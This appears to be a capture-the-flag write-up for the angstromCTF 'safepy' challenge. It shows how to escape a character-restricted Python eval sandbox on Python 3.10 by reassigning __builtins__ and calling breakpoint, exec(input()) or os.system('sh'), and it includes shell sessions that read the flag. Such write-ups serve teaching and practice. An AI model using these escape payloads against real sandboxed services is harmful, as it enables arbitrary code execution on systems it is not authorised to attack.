# safepy

Categories: misc

Description:
> safepy
>
> "angstrom needs a pyjail" - kmh11
>
>
> $ `nc challs.actf.co 31401`
>
> author: aplet123
>
> [Dockerfile](src/Dockerfile) [jail.py](src/jail.py)

**Tags:** python, jail

## Takeaways

* Walrus to chain multiple expressions
* Shellcode restricted only to the characters `'():=_abcdefghijklmnopqrstuvwxyz`
  * No whitespaces were allowed
* `__builtins__` internals

## Solution

The source code of the challenge is really simple:

```python
#!/usr/local/bin/python
cod = input("sned cod: ")

if any(x not in "q(jw=_alsynxodtg)feum'zk:hivbcpr" for x in cod):
    print("bad cod")
else:
    try:
        print(eval(cod, {"__builtins__": {"__import__": __import__}}))
    except Exception as e:
        print("oop", e)
```

Okay, as it seems we have a bunch of whitelisted characters with which we need to write our code that pops a shell in order to read the flag file. The `__builtins__` seem to be deleted when our code gets run. From the [Dockerfile](src/Dockerfile), we know that we are running python version `3.10-slim-bullseye`. Let's sort the whitelist so that we can get a better visual understanding:

```python
In [1]: ''.join(sorted("q(jw=_alsynxodtg)feum'zk:hivbcpr"))
Out[1]: "'():=_abcdefghijklmnopqrstuvwxyz"
```

Okay, so here are our observations:

* We can do function calls or group things as the parentheses `()` are allowed
* We can use the new [walrus operator](https://docs.python.org/3/whatsnew/3.8.html#assignment-expressions) `:=`
* We can use strings with the single quote `'`
* All 26 lowercase letters are allowed
* We are allowed the underscore `_`. This is good because we can access internal stuff, for example `__builtins__`
* We are **not** allowed to use spaces. This is a bummer.
* We are **not** allowed to use comma `,`. This is also a bummer, e.g. for function calls with more than one arguments.
* We are **not** allowed to use the (double) star `*` operator. This is a bummer because we could be expanding things without using a comma. For example, in function calls that require more than one argument.
* We are **not** allowed the dot `.`. This is a bummer because we cannot access members fields.
  * An alternative to the dot `.` for accessing member fields is the `getattr(obj, 'field')` method. However, this is not viable as we need the comma in this case.
* We can create a dummy tuple:
  ```python
  In [5]: type(())
  Out[5]: tuple
  ```
* We can use anonymous lambda functions, which do not take any arguments. And we can also invoke them:
  ```python
  In [6]: lambda:'hello'
  Out[6]: <function __main__.<lambda>()>

  In [7]: (lambda:'hello')()
  Out[8]: 'hello'
  ```

Okay, let's modify the code a little bit to make it easier to play around in `ipython`:

```python
def jail(cod):
  if any(x not in "q(jw=_alsynxodtg)feum'zk:hivbcpr" for x in cod):
    print("bad cod. Won't be executed in regular jail.")
  try:
    print(eval(cod, {"__builtins__": {"__import__": __import__}}))
  except Exception as e:
    print("Exception: ", e)
```

```python
In [26]: jail('breakpoint')
Exception:  name 'breakpoint' is not defined
```

Hmm.. As we see, the `eval` replaces the `__builtins__` global (where `breakpoint` is defined) with its own `__builtins__` dictionary. According to the [documentation](https://docs.python.org/3/library/functions.html#eval):

> [...] If the `globals` dictionary is present and does **not** contain a value for the key `__builtins__`, a reference to the dictionary of the built-in module `builtins` is inserted under that key before expression is parsed. **That way you can control what builtins are available to the executed code by inserting your own `__builtins__` dictionary into globals before passing it to `eval()`**. If the `locals` dictionary is omitted it defaults to the `globals` dictionary. [...]

Okay, so only the `__import__` built-in should be available to us. Let's test this:

```python
In [30]: jail('__import__')
<built-in function __import__>
```

Great! So we can import modules. But we cannot use the `.` to access members. For example:

```python
In [75]: jail("__import__('builtins')")
<module 'builtins' (built-in)>

In [76]: jail("__import__('builtins').breakpoint")
bad cod. Won't be executed in regular jail.
<built-in function breakpoint>
```

So, after we import the `builtins` module, how can we access the `breakpoint` function? Here comes some creativity and trial and error:

* We will use the walrus operator (`:=`) to chain multiple expressions. For example:
  ```python
  In [79]: jail("((x:='a')and(y:='b')and(x))")
  a
  ```
* We will replaced the `__builtins__` with the return value of `__import__('builtins')`.

Next, we will try to somehow invoke `breakpoint`. Let's see:

```python
In [123]: jail("(__builtins__:=__import__('builtins'))")
<module 'builtins' (built-in)>

In [124]: jail("((__builtins__:=__import__('builtins'))and(breakpoint))")
Exception:  name 'breakpoint' is not defined

In [125]: jail("((__builtins__:=__import__('builtins'))and(lambda:breakpoint))")
<function <lambda> at 0x7ff59f016440>

In [126]: jail("((__builtins__:=__import__('builtins'))and((lambda:breakpoint)()))")
<built-in function breakpoint>

In [127]: jail("((__builtins__:=__import__('builtins'))and((lambda:breakpoint)()()))")
--Return--
> <string>(1)<module>()->None
(Pdb) import os; os.system('sh');
$ ls
Dockerfile  flag.txt  jail.py
$ cat flag.txt
actf{c0uln7_g3t_1t_7o_w0rk_0n_python39_s4dge}
```

And we get the flag!

`actf{c0uln7_g3t_1t_7o_w0rk_0n_python39_s4dge}`

But why does this even work? Well, if we check [What's new in python 3.10](https://docs.python.org/3/whatsnew/3.10.html#other-language-changes), we will find the following change:

> Functions have a new `__builtins__` attribute which is used to look for builtin symbols when a function is **executed**, instead of looking into `__globals__['__builtins__']`. The attribute is initialized from `__globals__['__builtins__']` if it exists, else from the current `builtins`. (Contributed by Mark Shannon in [bpo-42990](https://bugs.python.org/issue?@action=redirect&bpo=42990).)

So, here is what is happening in our payload:

* We import the module `builtins` via the `__import__('builtins')` statement
* We assigned the imported module into the `__builtins__` global variable
  * This assignment updates the `__globals__['__builtins__']` with the imported module
* We create an anonymous function with the `lambda` expression
  * This function returns the `breakpoint` symbol when executed
  * According to the 3.10 change above, the `breakpoint` symbol will be looked up into the lambda's `.__builtins__` attribute when the function gets executed
  * The `.__builtins__` attribute will be initialized when the function gets created to whatever value the global `__builtins__` has. For example:
    ```python
    In [138]: jail("((__builtins__:='ABCD')and((lambda:breakpoint).__builtins__))")
    bad cod. Won't be executed in regular jail.
    ABCD

    In [139]: jail("((__builtins__:={'ABCD': 'foobar'})and((lambda:breakpoint).__builtins__))")
    bad cod. Won't be executed in regular jail.
    {'ABCD': 'foobar'}

    In [140]: jail("((__builtins__:=__import__('builtins'))and((lambda:breakpoint).__builtins__))")
    bad cod. Won't be executed in regular jail.
    {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, ...}
    ```
* We execute the anonymous lambda function.
   * The lambda function returns the `breakpoint` symbol
   * This symbol will be looked up in the `.__builtins__` attribute of the function
* We execute the return value of the lambda function, i.e. we execute `breakpoint()`
* We pop a shell. Yay!

### Alternative solutions

#### Alternative 1

Since now we have all the builtin functions, instead of `breakpoint()` we could also use `exec(input())`:

```python
In [159]: jail("((__builtins__:=__import__('builtins'))and((lambda:exec(input()))()))")
import os; os.system('sh');
$ cat flag.txt
actf{c0uln7_g3t_1t_7o_w0rk_0n_python39_s4dge}
```

#### Alternative 2

If you understood everything so far, you know that when the lambda gets executed, symbols will be looked up from the lambda's `.__builtins__` attribute, which is initialized from the global variable `__builtins__`. So, the following is also legal:

```python
In [160]: jail("((__builtins__:=__import__('os'))and((lambda:system('sh'))()))")
$ cat flag.txt
actf{c0uln7_g3t_1t_7o_w0rk_0n_python39_s4dge}
```
